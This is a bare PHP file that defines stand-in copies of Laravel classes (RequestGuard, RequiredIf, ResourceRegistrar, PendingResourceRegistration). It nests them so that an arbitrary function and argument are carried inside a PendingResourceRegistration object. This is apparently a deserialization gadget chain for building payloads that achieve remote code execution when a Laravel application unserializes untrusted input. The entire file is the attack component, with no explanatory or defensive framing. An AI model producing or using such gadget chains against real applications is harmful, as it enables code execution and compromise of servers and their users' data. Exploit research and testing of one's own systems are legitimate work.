<?php

namespace Illuminate\Auth
{
    class RequestGuard
    {
        protected $callback;
        protected $request;
        protected $provider;
        public function __construct($callback, $request)
        {
            $this->callback = $callback;
            $this->request = $request;
            $this->provider = 1;
        }
    }
}

namespace Illuminate\Validation\Rules
{
    class RequiredIf
    {
        public $condition;
        public function __construct($func, $arg)
        {
            $this->condition = [new \Illuminate\Auth\RequestGuard($func, $arg), "user"];
        }
    }
}

namespace Illuminate\Routing
{
    class ResourceRegistrar
    {
        protected $router;
        public function __construct()
        {
            $this->router = null;
        }
    }

    class PendingResourceRegistration
    {
        protected $registrar;
        protected $name;
        protected $registered = false;
        public function __construct($func, $arg)
        {
            $this->registrar = new \Illuminate\Routing\ResourceRegistrar();
            $this->name = new \Illuminate\Validation\Rules\RequiredIf($func, $arg);
        }
    }
}
